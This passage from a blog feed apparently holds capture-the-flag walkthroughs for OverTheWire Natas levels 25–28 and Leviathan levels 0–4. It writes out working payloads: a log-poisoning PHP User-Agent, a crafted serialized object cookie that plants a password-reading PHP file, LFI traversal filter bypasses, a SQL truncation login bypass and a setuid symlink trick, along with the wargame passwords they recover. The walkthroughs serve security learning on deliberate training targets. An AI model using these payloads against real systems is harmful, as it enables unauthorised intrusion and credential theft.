    if ($handle = opendir($path))
        while (false !== ($file = readdir($handle)))
            if ($file != "." &amp;&amp; $file != "..")
                $listoffiles[]=$file;

    closedir($handle);
    return $listoffiles;
} 

function logRequest($message){
    $log="[". date("d.m.Y H::i:s",time()) ."]";
    $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
    $log=$log . " \"" . $message ."\"\n"; 
    $fd=fopen("/tmp/natas25_" . session_id() .".log","a");
    fwrite($fd,$log);
    fclose($fd);
}
</code></pre>

<p>?>
```</p>

<p>At first it would seem that we have to find a way to traverse to <code>/etc/natas_webpass</code> and read the password from there, however there is a check in the code to prevent us from going there. So I next looked at bypassing the LFI filter and played a bit in a PHP sandbox to see which injection would work against the filter. Finally, I was able to read the log file with this injection: <code>lang=&hellip;.//&hellip;.//&hellip;.//&hellip;.//&hellip;.//tmp/natas25_6n8g6cuqkbuthmp8usvql1vej2.log</code></p>

<p>``` plain
[17.10.2015 14::02:27] Mozilla/5.0 (X11; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0 &ldquo;Directory traversal attempt! fixing request.&rdquo; [17.10.2015 14::02:38] Mozilla/5.0 (X11; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0 &ldquo;Directory traversal attempt! fixing request.&rdquo;
Notice: Undefined variable: __GREETING in /var/www/natas/natas25/index.php on line 80</p>

<p>Notice: Undefined variable: __MSG in /var/www/natas/natas25/index.php on line 81</p>

<p>Notice: Undefined variable: __FOOTER in /var/www/natas/natas25/index.php on line 82
```</p>

<p>Excellent, now we&rsquo;re getting somewhere! The next technique we&rsquo;ll use to get the password is a log poisoning attack. Read more <a href="http://hackerforhire.com.au/apache-log-poisoning-with-local-file-inclusion/">here</a></p>

<p>If you look at the <em>logRequest</em> function you will see that it appends various information to a log file. Part of this information is under our control (the User Agent). By using the log poisoning attack, we can change the User Agent to some PHP code of our choosing, that will then get written to the log file when we do an action which should be logged. And when the server reads the log file, it will happily execute the code contained within. Let&rsquo;s see this in practice:</p>

<ul>
<li><p>I changed my user agent to <code>&lt;?php readfile(&lsquo;/etc/natas_webpass/natas26&rsquo;); ?></code></p></li>
<li><p>Then I refreshed the page where I was looking at the log file and among all the logged information was also the password:</p></li>
</ul>


<p><code>plain
"Directory traversal attempt! fixing request." [17.10.2015 15::56:48] oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
</code></p>

<p>The password is <code>oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T</code></p>

<h3>Level 26</h3>

<p><img class="center" src="/images/overthewire/natas/natas26.png" title="&lsquo;natas26&rsquo; &lsquo;natas 26&rsquo;" ></p>

<p>Source code:</p>

<p>``` php
&lt;?php</p>

<pre><code>// sry, this is ugly as hell.
// cheers kaliman ;)
// - morla

class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct($file){
        // initialise variables
        $this-&gt;initMsg="#--session started--#\n";
        $this-&gt;exitMsg="#--session end--#\n";
        $this-&gt;logFile = "/tmp/natas26_" . $file . ".log";

        // write initial message
        $fd=fopen($this-&gt;logFile,"a+");
        fwrite($fd,$initMsg);
        fclose($fd);
    }                       

    function log($msg){
        $fd=fopen($this-&gt;logFile,"a+");
        fwrite($fd,$msg."\n");
        fclose($fd);
    }                       

    function __destruct(){
        // write exit message
        $fd=fopen($this-&gt;logFile,"a+");
        fwrite($fd,$this-&gt;exitMsg);
        fclose($fd);
    }                       
}

function showImage($filename){
    if(file_exists($filename))
        echo "&lt;img src=\"$filename\"&gt;";
}

function drawImage($filename){
    $img=imagecreatetruecolor(400,300);
    drawFromUserdata($img);
    imagepng($img,$filename);     
    imagedestroy($img);
}

function drawFromUserdata($img){
    if( array_key_exists("x1", $_GET) &amp;&amp; array_key_exists("y1", $_GET) &amp;&amp;
        array_key_exists("x2", $_GET) &amp;&amp; array_key_exists("y2", $_GET)){

        $color=imagecolorallocate($img,0xff,0x12,0x1c);
        imageline($img,$_GET["x1"], $_GET["y1"], 
                        $_GET["x2"], $_GET["y2"], $color);
    }

    if (array_key_exists("drawing", $_COOKIE)){
        $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        if($drawing)
            foreach($drawing as $object)
                if( array_key_exists("x1", $object) &amp;&amp; 
                    array_key_exists("y1", $object) &amp;&amp;
                    array_key_exists("x2", $object) &amp;&amp; 
                    array_key_exists("y2", $object)){

                    $color=imagecolorallocate($img,0xff,0x12,0x1c);
                    imageline($img,$object["x1"],$object["y1"],
                            $object["x2"] ,$object["y2"] ,$color);

                }
    }    
}

function storeData(){
    $new_object=array();

    if(array_key_exists("x1", $_GET) &amp;&amp; array_key_exists("y1", $_GET) &amp;&amp;
        array_key_exists("x2", $_GET) &amp;&amp; array_key_exists("y2", $_GET)){
        $new_object["x1"]=$_GET["x1"];
        $new_object["y1"]=$_GET["y1"];
        $new_object["x2"]=$_GET["x2"];
        $new_object["y2"]=$_GET["y2"];
    }

    if (array_key_exists("drawing", $_COOKIE)){
        $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
    }
    else{
        // create new array
        $drawing=array();
    }

    $drawing[]=$new_object;
    setcookie("drawing",base64_encode(serialize($drawing)));
}
</code></pre>

<p>?></p>

<p>&lt;?php</p>

<pre><code>session_start();

if (array_key_exists("drawing", $_COOKIE) ||
    (   array_key_exists("x1", $_GET) &amp;&amp; array_key_exists("y1", $_GET) &amp;&amp;
        array_key_exists("x2", $_GET) &amp;&amp; array_key_exists("y2", $_GET))){  
    $imgfile="img/natas26_" . session_id() .".png"; 
    drawImage($imgfile); 
    showImage($imgfile);
    storeData();
}
</code></pre>

<p>?></p>

<p>```</p>

<p>Code looks complicated so I&rsquo;m breaking it down in little pieces:</p>

<ul>
<li><p>We have a Logger class that writes some messages to a log file</p></li>
<li><p>the <em>showImage()</em> function sets the image tag source to the given filename, if that file exists</p></li>
<li><p>the <em>drawImage()</em> function creates an image and outputs it to the browser</p></li>
<li><p><em>drawFromUserdata()</em> uses the user-supplied coordinates to draw lines across the image</p></li>
<li><p><em>storeData()</em> populates an array with the 4 $_GET parameters and sets a cookie named <em>drawing</em> to contain the serialized and base64 encoded value of the previously created array</p></li>
</ul>


<p>So far, out of ideas, but when reading about <em>unserialize()</em> in the PHP manual, there was a security warning:</p>

<blockquote><p>Warning</p>

<p>Do not pass untrusted user input to unserialize(). Unserialization can result in code being loaded and executed due to object instantiation and
autoloading, and a malicious user may be able to exploit this. Use a safe, standard data interchange format such as JSON (via json_decode() and
json_encode()) if you need to pass serialized data to the user.</p></blockquote>

<p>Next I proceeded to read more about exploiting PHP unserialization, and there were quite a few resources available, so I must be on the right track :D And this also explained the existence of the Logger class, which isn&rsquo;t instantiated anywhere in the program. But first, we must understand what serialization is all about.</p>

<ul>
<li><p><em>string serialize ( mixed $value )</em></p></li>
<li><p>Generates a storable representation of a value. This is useful for storing or passing PHP values around without losing their type and structure. Returns a binary string containing a byte-stream representation of value that can be stored anywhere.</p></li>
</ul>


<p><strong>Serialization</strong> is the conversion of a PHP data structure to a string that can be passed to external applications, such as databases, or stored in files etc.</p>

<p><strong>Unserialization</strong> converts the string back to a PHP value</p>

<p>Now let&rsquo;s look at what OWASP says about the PHP object injection attack:</p>

<blockquote><p>The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP
allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP
object(s) injection into the application scope.</p>

<p>In order to successfully exploit a PHP Object Injection vulnerability two conditions must be met:</p>

<p>The application must have a class which implements a PHP magic method (such as <strong>wakeup or </strong>destruct) that can be used to carry out malicious
attacks, or to start a &ldquo;POP chain&rdquo;.</p>

<p>All of the classes used during the attack must be declared when the vulnerable unserialize() is being called, otherwise object autoloading must be
supported for such classes.</p></blockquote>

<p>Well, we can exploit this because both conditions apply to our case! Remember that we have the Logger class,  and it contains a <em>__construct()</em> and <em>__destruct()</em> magic method. So the class wasn&rsquo;t just lying around for nothing in the code, hehehe!</p>

<p>Before continuing, I want to show an <a href="http://www.w3resource.com/php/function-reference/serialize.php">example of serialization</a>, so you can have an idea of what it looks like with an easier to understand example than deciphering the <em>drawing</em> cookie:</p>

<p>``` php</p>

<pre><code>&lt;?php  
$serialized_data = serialize(array('Math', 'Language', 'Science'));  
echo  $serialized_data . '&lt;br&gt;';  
?&gt;  
</code></pre>

<p>```</p>

<p>And the output is <code>a:3:{i:0;s:4:&ldquo;Math&rdquo;;i:1;s:8:&ldquo;Language&rdquo;;i:2;s:7:&ldquo;Science&rdquo;;}</code>. Ugh, looks complicated! But here it is:</p>

<ul>
<li><p>a = array, 3 = the number of elements in the array</p></li>
<li><p>i = integer, 0 = index in the array, s = string, 4 = length of the string, Math is the element value, and this continues for the other elements as well</p></li>
</ul>


<p>Now, to exploit this. We have:</p>

<ul>
<li><p>a way to inject our own code into the application (by changing the <em>drawing</em> cookie that will get unserialized)</p></li>
<li><p>a way to write to a file (leverage the Logger class)</p></li>
<li><p>a way to read a file (we can browse to where images are stored inside <em>img/</em>)</p></li>
</ul>


<p>First, I made my own malicious Logger class:</p>

<p>``` php
&lt;?php
class Logger{</p>

<pre><code>    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct(){
        // initialise variables
        $this-&gt;initMsg="pwn";
        $this-&gt;exitMsg= "&lt;?php echo readfile('/etc/natas_webpass/natas27');?&gt;";
        $this-&gt;logFile = "img/pass.php";
    }                                            

    function __destruct(){
        // write exit message
        $fd=fopen($this-&gt;logFile,"a+");
        fwrite($fd,$this-&gt;exitMsg);
        fclose($fd);
    }                       
}
</code></pre>

<p>$myobj = new Logger();
echo base64_encode(serialize($myobj));
?>
```</p>

<p>This code I wrote and tested on my local machine, first with local files, to see that it behaves as I want it to. When that was done, I used PHP to serialize and base64 encode it, so I can paste it in the cookie, and this is how it looks like:</p>

<ul>
<li>serialized:</li>
</ul>


<p><code>plain
O:6:"Logger":3:{s:15:"LoggerlogFile";s:12:"img/pass.php";s:15:"LoggerinitMsg";s:3:"pwn";s:15:"LoggerexitMsg";s:52:"&lt;?php echo readfile('/etc/natas_webpass/natas27');?&gt;";}
</code></p>

<ul>
<li>base64 encoded:</li>
</ul>


<p><code>plain
Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMjoiaW1nL3Bhc3MucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MzoicHduIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NTI6Ijw/cGhwIGVjaG8gcmVhZGZpbGUoJy9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7Pz4iO30=
</code></p>

<p>In my Logger class I just removed what wasn&rsquo;t necessary from the original code, and made the modifications so that the script will create a PHP file inside the <em>img/</em> directory, with this code inside it:</p>

<p><code>php
&lt;?php echo readfile('/etc/natas_webpass/natas27');?&gt;
</code></p>

<p>And after changing the cookie and navigating to pass.php, the code gets executed and spits the password: <code>55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ</code></p>

<p>Because I used <em>readfile()</em>, I actually saw the password followed by a space and 33 (the length of read data). I looked in the PHP manual and noticed saw that <em>file_get_contents()</em> is a better choice for reading a file into a string, but I was too lazy to change it!</p>

<blockquote><p>file_get_contents() is the preferred way to read the contents of a file into a string.</p></blockquote>

<p>Helpful resources:</p>

<p><a href="https://stackoverflow.com/questions/8641889/how-to-use-php-serialize-and-unserialize">PHP serialization</a></p>

<p><a href="https://www.owasp.org/index.php/PHP_Object_Injection">OWASP PHP Object Injection</a></p>

<p><a href="https://www.notsosecure.com/2015/09/24/remote-code-execution-via-php-unserialize/">RCE with PHP unserialize</a></p>

<p><a href="https://vagosec.org/2013/09/wordpress-php-object-injection/">PHP object injection</a></p>

<p><a href="https://www.owasp.org/images/9/9e/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf">unserialize() exploitation</a></p>

<h3>Level 27</h3>

<p><img class="center" src="/images/overthewire/natas/natas14.png" title="&lsquo;natas27&rsquo; &lsquo;natas 27&rsquo;" ></p>

<p>``` php
&lt;?</p>

<p>// morla / 10111
// database gets cleared every 5 min</p>

<p>/<em>
CREATE TABLE <code>users</code> (
  <code>username</code> varchar(64) DEFAULT NULL,
  <code>password</code> varchar(64) DEFAULT NULL
);
</em>/</p>

<p>function checkCredentials($link,$usr,$pass){</p>

<pre><code>$user=mysql_real_escape_string($usr);
$password=mysql_real_escape_string($pass);

$query = "SELECT username from users where username='$user' and password='$password' ";
$res = mysql_query($query, $link);
if(mysql_num_rows($res) &gt; 0){
    return True;
}
return False;
</code></pre>

<p>}</p>

<p>function validUser($link,$usr){</p>

<pre><code>$user=mysql_real_escape_string($usr);

$query = "SELECT * from users where username='$user'";
$res = mysql_query($query, $link);
if($res) {
    if(mysql_num_rows($res) &gt; 0) {
        return True;
    }
}
return False;
</code></pre>

<p>}</p>

<p>function dumpData($link,$usr){</p>

<pre><code>$user=mysql_real_escape_string($usr);

$query = "SELECT * from users where username='$user'";
$res = mysql_query($query, $link);
if($res) {
    if(mysql_num_rows($res) &gt; 0) {
        while ($row = mysql_fetch_assoc($res)) {
            //thanks to Gobo for reporting this bug!
            //return print_r($row);
            return print_r($row,true);
        }
    }
}
return False;
</code></pre>

<p>}</p>

<p>function createUser($link, $usr, $pass){</p>

<pre><code>$user=mysql_real_escape_string($usr);
$password=mysql_real_escape_string($pass);

$query = "INSERT INTO users (username,password) values ('$user','$password')";
$res = mysql_query($query, $link);
if(mysql_affected_rows() &gt; 0){
    return True;
}
return False;
</code></pre>

<p>}</p>

<p>if(array_key_exists(&ldquo;username&rdquo;, $<em>REQUEST) and array_key_exists(&ldquo;password&rdquo;, $</em>REQUEST)) {</p>

<pre><code>$link = mysql_connect('localhost', 'natas27', '&lt;censored&gt;');
mysql_select_db('natas27', $link);


if(validUser($link,$_REQUEST["username"])) {
    //user exists, check creds
    if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
        echo "Welcome " . htmlentities($_REQUEST["username"]) . "!&lt;br&gt;";
        echo "Here is your data:&lt;br&gt;";
        $data=dumpData($link,$_REQUEST["username"]);
        print htmlentities($data);
    }
    else{
        echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "&lt;br&gt;";
    }        
} 
else {
    //user doesn't exist
    if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){ 
        echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
    }
}

mysql_close($link);
</code></pre>

<p>} else {
?>
```</p>

<p>Before digging in the code, I just tested the functionality of the login system..you can create a user and then view its username and password values. After logging in, you will see something like this:</p>

<p><code>plain
 Welcome haxor!
Here is your data:
Array ( [username] =&gt; haxor [password] =&gt; doge )
</code></p>

<p>I then tried to create a natas28 user to see what would happen&hellip;and surprise!</p>

<p><code>plain
Wrong password for user: natas28
</code></p>

<p>This tells us that there is indeed such a user in the database and that our random password doesn&rsquo;t match the one stored in the database..so that&rsquo;s what we want to get! I&rsquo;ve tried some SQLi, but got nothing. So back to reading PHP code it is! (ugh)</p>

<ul>
<li><p><em>checkCredentials()</em> checks if the provided username and password (which are both escaped) exist in the table, returning True if they are</p></li>
<li><p><em>validUser()</em> checks if the username is already in the table</p></li>
<li><p><em>dumpData()</em> prints the data about the array containing the username and password as seen above in the log in message</p></li>
<li><p><em>createUser()</em> inserts a new username-password pair in the table</p></li>
</ul>


<p>The important part of the rest of the code is that it looks up the username in the table, creating it if it doesn&rsquo;t exist, and proceeding with the credentials check and data printing if it already exists. After reading about the functions in the PHP manual I still had no idea how to continue. At this point, noticing the flow of the code was helpful:</p>

<p>1) when giving a username that already exists, it continues to the credentials checking part</p>

<p>2) if credential check is successful, the welcome message and credentials data are printed (without any other action from the user)</p>

<p>Judging from the above lines of reasoning, I thought that the interesting function that I might need to check again is the <em>dumpData()</em> one (because it returns data from the database, so it&rsquo;s possible to find out about the natas18 user from it). Still no idea how to do that though, but another thing I noticed is how important the username is for the code: all the checks and actions revolve around it, and it was also possible to determine the existence of the natas18 user because of that. So, at this point, I thought the next part should be to convince the code to dump the data for natas18.</p>

<p>I next thought about creating a username of natas18 followed by many spaces, exceeding the 64 character limit. The code still returned wrong password, so all the spaces must be trimmed. I made a string in Python to check what really happens:</p>

<p><code>python
user = 'natas28' + ' ' * 64 + 'end'
print user
'natas28                                                                end'
</code></p>

<p>And I stopped inputting a password, because the code created users irrespective if they had passwords, and I could log in as an existing user with a blank password, as can be seen from this test dummy:</p>

<p><code>plain
Welcome yo!
Here is your data:
Array ( [username] =&gt; yo [password] =&gt; )
</code></p>

<p>Now I tried to create a user with that long string and yeah, the space is removed:</p>

<p><code>plain
User natas28 end was created!
</code></p>

<p>However, when next I tried to log in just as natas28 with no password, here is what awaited me!</p>

<p><code>plain
Welcome natas28!
Here is your data:
Array ( [username] =&gt; natas28 [password] =&gt; JWwR438wkgTsNKBbcJoowyysdM82YjeF )
</code></p>

<p>Why was this possible? Remember the flow of the code when you try to log in:</p>

<p>``` plain
validUser()</p>

<pre><code>if user exists, checkCredentials()
    if yay here is your data
    if nay wrong password message
else createUser()
</code></pre>

<p>```</p>

<p>To confirm it, I used <a href="http://sqlfiddle.com/">sqlfiddle</a> to generate a database and queries that mimic the PHP code.</p>

<p>First, table creation:</p>

<p><code>sql
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
</code></p>

<p>Then, inserting the natas28 user with the password (I used a dummy one but assume it&rsquo;s the one we&rsquo;re after):</p>

<p><code>sql
INSERT INTO users (username,password) values ('natas28','omgpass');
</code></p>

<p>Next, the querying for the username as it happens in the validUser() function:</p>

<p><code>sql
SELECT * from users where username='natas28';
</code></p>

<p>And the result:</p>

<p><img class="center" src="/images/overthewire/natas/sqlfiddle.png" title="&lsquo;sqlfiddle&rsquo; &lsquo;sqlfiddle&rsquo;" ></p>

<p>When trying to insert the long string next I received a data truncation error because it was larger than the allowed 64 characters, so I manually adjusted it to natas28 + 57 spaces:</p>

<p><code>plain
'natas28                                                         '
</code></p>

<p>Then I added it to the table:</p>

<p><code>sql
INSERT INTO users (username,password) values ('natas28                                                         ', '');
</code></p>

<p>And when querying the database both are returned (with the first being the original natas28 user):</p>

<p><img class="center" src="/images/overthewire/natas/sqlfiddle2.png" title="&lsquo;sqlfiddle2&rsquo; &lsquo;sqlfiddle2&rsquo;" ></p>

<p>To summarize:</p>

<p>``` plain</p>

<h1>with input of &lsquo;natas28                                                                end&rsquo;</h1>

<p>validUser()</p>

<pre><code>long string is truncated to natas28 end, which doesn't exist in the table
</code></pre>

<p>createUser()</p>

<pre><code># input becomes 'natas28                                                         '
the value that is inserted in the table is truncated to the max length, in this case natas28 + 57 spaces
</code></pre>

<h1>now check again with username of natas28 and no password</h1>

<p>validUser()</p>

<pre><code>username already exists, so checkCredentials()
with the space trimming, the code returns both the original and my inserted username, as seen on sqlfiddle (but due to the PHP code, we only get the first row, which is fine, because that's the one we care about
</code></pre>

<p>```</p>

<p>Password is <code>JWwR438wkgTsNKBbcJoowyysdM82YjeF</code></p>

<h3>Level 28</h3>

<p>And it&rsquo;s finished for now! Awesome challenge!</p>

<p><img class="center" src="/images/overthewire/natas/gz.png" title="&lsquo;gz&rsquo; &lsquo;gz&rsquo;" ></p>

<p>``` plain</p>

<hr />

<p>&lt; You will triumph over your enemy. ></p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[OverTheWire: Leviathan]]></title>
    <link href="http://chousensha.github.io/blog/2015/07/30/overthewire-leviathan/"/>
    <updated>2015-07-30T10:01:22-04:00</updated>
    <id>http://chousensha.github.io/blog/2015/07/30/overthewire-leviathan</id>
    <content type="html"><![CDATA[<p>The next step in difficulty for the OverTheWire wargames is Leviathan. From the description:</p>

<blockquote><p>This wargame doesn&rsquo;t require any knowledge about programming &ndash; just a bit of common sense and some knowledge about basic *nix commands.</p></blockquote>

<p>Leviathan’s levels are called leviathan0, leviathan1, … etc. and can be accessed on <strong>leviathan.labs.overthewire.org</strong> through SSH.</p>

<p>To login to the first level use:</p>

<p>Username: leviathan0</p>

<p>Password: leviathan0</p>

<p>Data for the levels can be found in the homedirectories.</p>

<!-- more -->


<h3>Level 0 &ndash;> Level 1</h3>

<p>There is no information about what you have to do for each level to progress, so you just have to look around.</p>

<p>If you do a <em>ls -la</em> in the home directory, you will see an interesting hidden directory owned by leviathan1:</p>

<p><code>plain
leviathan0@melinda:~$ ls -la
total 24
drwxr-xr-x   3 root       root       4096 Nov 14  2014 .
drwxr-xr-x 167 root       root       4096 Jul  9 16:27 ..
drwxr-x---   2 leviathan1 leviathan0 4096 Jul 17 16:44 .backup
-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
</code></p>

<p>Inside there is a bookmarks.html file with lots of links, so I tried grepping for the word password and wasn&rsquo;t disappointed:</p>

<p><code>plain
leviathan0@melinda:~/.backup$ cat bookmarks.html  | grep password
&lt;DT&gt;&lt;A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71"&gt;password to leviathan1&lt;/A&gt;
</code></p>

<h3>Level 1 &ndash;> Level 2</h3>

<p>There is a setuid binary in the home folder that asks for a password. Running <em>strings</em> on it didn&rsquo;t reveal much, except that it uses <em>strcmp</em>..so it compares the input it receives with something..</p>

<p>I solved this by running <em>ltrace</em> on the binary. <em>ltrace</em> is a library call tracer:</p>

<blockquote><p>ltrace  is  a  program  that simply runs the specified command until it
exits.  It intercepts and records the dynamic library calls  which  are
called  by  the  executed process and the signals which are received by
 that process.  It can also intercept and print the  system  calls  executed by the program.</p></blockquote>

<p><code>plain
leviathan1@melinda:~$ ltrace ./check
__libc_start_main(0x804852d, 1, 0xffffd7a4, 0x80485f0 &lt;unfinished ...&gt;
printf("password: ")                                                                        = 10
getchar(0x8048680, 47, 0x804a000, 0x8048642password: abcd
)                                                = 97
getchar(0x8048680, 47, 0x804a000, 0x8048642)                                                = 98
getchar(0x8048680, 47, 0x804a000, 0x8048642)                                                = 99
strcmp("abc", "sex")                                                                        = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                                                        = 29
+++ exited (status 0) +++
</code></p>

<p>In the <em>ltrace</em> output you can actually see the password that your input is compared with. Give it to the program and you will get a shell as leviathan2:</p>

<p><code>plain
leviathan1@melinda:~$ ./check
password: sex
$ whoami
leviathan2
</code></p>

<p>As in the previous wargame, look in <em>/etc/</em> for the password:</p>

<p><code>plain
$ cat /etc/leviathan_pass/leviathan2
ougahZi8Ta
</code></p>

<h3>Level 2 &ndash;> Level 3</h3>

<p>In this level we have another setuid binary named printfile. If you try to read the password file for the next level you just get a message that you an&rsquo;t have that file:</p>

<p><code>plain
leviathan2@melinda:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
</code></p>

<p>Running <em>ltrace</em> again we see the <em>access</em> system call is being used:</p>

<p><code>plain
leviathan2@melinda:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3   
__libc_start_main(0x804852d, 2, 0xffffd774, 0x8048600 &lt;unfinished ...&gt;
access("/etc/leviathan_pass/leviathan3", 4)                                                 = -1
puts("You cant have that file..."You cant have that file...
)                                                          = 27
+++ exited (status 1) +++
</code></p>

<p>This is good news, because <em>access</em> is vulnerable to race conditions, as can be seen from its man page:</p>

<blockquote><p>access() checks whether the calling process can access the file pathname. If pathname is a symbolic link, it is dereferenced.</p>

<p>The check is done using the calling process&rsquo;s real UID and GID,  rather than the effective IDs as is done when actually attempting an operation
(e.g., open(2)) on the file.  This allows set-user-ID programs to  easily determine the invoking user&rsquo;s authority.</p>

<p>Warning: Using access() to check if a user is authorized to, for  example, open a file before actually doing so using open(2) creates a security
hole, because the user  might  exploit  the  short  time  interval between  checking and opening the file to manipulate it. For this reason, the   > use of this system call should be avoided.</p></blockquote>

<p>A more detailed description from <a href="https://www.owasp.org/index.php/File_Access_Race_Condition:_TOCTOU">OWASP</a>:</p>

<blockquote><p>The window of time between when a file property is checked and when the file is used can be exploited to launch a privilege escalation attack.</p>

<p>File access race conditions, known as time-of-check, time-of-use (TOCTOU) race conditions, occur when:</p>

<p>The program checks a property of a file, referencing the file by name.
The program later performs a filesystem operation using the same filename and assumes that the previously-checked property still holds.</p></blockquote>

<p>The first thing I thought was to create a file and make it a symlink to the password file, but it didn&rsquo;t work. So I just made a random file for test purposes and used <em>ltrace</em> again to see what is happening when accessing it:</p>

<p><code>plain
leviathan2@melinda:~$ ltrace ./printfile /tmp/baka/readme
__libc_start_main(0x804852d, 2, 0xffffd784, 0x8048600 &lt;unfinished ...&gt;
access("/tmp/baka/readme", 4)                                                               = 0
snprintf("/bin/cat /tmp/baka/readme", 511, "/bin/cat %s", "/tmp/baka/readme")               = 25
system("/bin/cat /tmp/baka/readme"test
 &lt;no return ...&gt;
--- SIGCHLD (Child exited) ---
&lt;... system resumed&gt; )                                                                      = 0
+++ exited (status 0) +++
</code></p>

<p>I have to say, I used help for this one, because it wasn&rsquo;t clear to me on how to proceed (it&rsquo;s also where I got stuck when I first attempted this wargame). If <em>access</em> returns successfully, it will <em>cat</em> the file that was passed to it (and it&rsquo;s actually <em>snprintf</em> that does the <em>cat</em>. Remember from Bandit how <em>cat</em> won&rsquo;t print files with spaces in their names, unless the spaces are escaped or the filename is surrounded by quotes. I made a new dummy file with a space in its name:</p>

<p><code>plain
leviathan2@melinda:/tmp/baka$ cat space\ file
test
leviathan2@melinda:/tmp/baka$ cat space file
cat: space: No such file or directory
cat: file: No such file or directory
</code></p>

<p>Now I ran <em>ltrace</em> again and tried to print this new file:</p>

<p><code>plain
leviathan2@melinda:~$ ltrace ./printfile /tmp/baka/space\ file
__libc_start_main(0x804852d, 2, 0xffffd764, 0x8048600 &lt;unfinished ...&gt;
access("/tmp/baka/space file", 4)                                                           = 0
snprintf("/bin/cat /tmp/baka/space file", 511, "/bin/cat %s", "/tmp/baka/space file")       = 29
system("/bin/cat /tmp/baka/space file"/bin/cat: /tmp/baka/space: No such file or directory
/bin/cat: file: No such file or directory
 &lt;no return ...&gt;
--- SIGCHLD (Child exited) ---
&lt;... system resumed&gt; )                                                                      = 256
+++ exited (status 0) +++
</code></p>

<p>There is a discrepancy between <em>access</em>, which checks the path of the file, and what <em>cat</em> tries to print, two different files that don&rsquo;t exist, <em>space</em> and <em>file</em> (because the space isn&rsquo;t seen as part of the filename, but as a separator between arguments):</p>

<ul>
<li><p><em>cat</em> tries /tmp/baka/space</p></li>
<li><p><em>cat</em> tries file</p></li>
</ul>


<p>This is where the symbolic link exploitation part comes in place. It didn&rsquo;t work before, but if I now create a symlink to the password file and name it <em>space</em>, it will match the first half of the file that <em>cat</em> will try to print:</p>

<p><code>plain
leviathan2@melinda:/tmp/baka$ ls -l
total 8
-rw-rw-r-- 1 leviathan2 leviathan2  5 Jul 31 12:18 readme
lrwxrwxrwx 1 leviathan2 leviathan2 30 Jul 31 15:45 space -&gt; /etc/leviathan_pass/leviathan3
-rw-rw-r-- 1 leviathan2 leviathan2  5 Jul 31 15:01 space file
</code></p>

<p>And now I run <em>printfile</em> again:</p>

<p><code>plain
leviathan2@melinda:~$ ./printfile /tmp/baka/'space file'
Ahdiemoo1j
/bin/cat: file: No such file or directory
</code></p>

<p>Yay! It worked! Because <em>cat</em> first tried to print <em>space</em>, it followed the symlink with the same name and printed the password!</p>

<h3>Level 3 &ndash;> Level 4</h3>

<p>And another setuid binary! Running <em>strings</em> on it revealed it&rsquo;s a program that gives you a shell if you enter the right password. Along with string names such as do_stuff, nothing and morenothing xD</p>

<p><em>ltrace</em> keeps helping a lot with these challenges:</p>

<p><code>plain
leviathan3@melinda:~$ ltrace ./level3
__libc_start_main(0x80485fe, 1, 0xffffd794, 0x80486d0 &lt;unfinished ...&gt;
strcmp("h0no33", "kakaka")                                                                  = -1
printf("Enter the password&gt; ")                                                              = 20
fgets(Enter the password&gt; huh
"huh\n", 256, 0xf7fcac20)                                                             = 0xffffd58c
strcmp("huh\n", "snlprintf\n")                                                              = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                                                                  = 19
+++ exited (status 0) +++
</code></p>

<p>The first <em>strcmp</em> doesn&rsquo;t seem to be used for anything, but the second one is interesting. It compares the given input with..snlprintf?! There is no such function in the C library, so I assumed it&rsquo;s just a string..and:</p>

<p><code>plain
leviathan3@melinda:~$ ./level3
Enter the password&gt; snlprintf
[You've got shell]!
$ whoami
leviathan4
$ cat /etc/leviathan_pass/leviathan4
vuH0coox6m
</code></p>

<p>Awesome! On to the next level!</p>

<h3>Level 4 &ndash;> Level 5</h3>

<p>There is a hidden directory in the home folder:</p>

<p><code>plain
leviathan4@melinda:~$ ls -la
total 24
drwxr-xr-x   3 root root       4096 Nov 14  2014 .
drwxr-xr-x 167 root root       4096 Jul  9 16:27 ..
-rw-r--r--   1 root root        220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root root       3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root root        675 Apr  9  2014 .profile
dr-xr-x---   2 root leviathan4 4096 Nov 14  2014 .trash
</code></p>

<p>Inside there&rsquo;s a program that gives some binary output when run:</p>

<p><code>plain
leviathan4@melinda:~/.trash$ ./bin
01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010
</code></p>

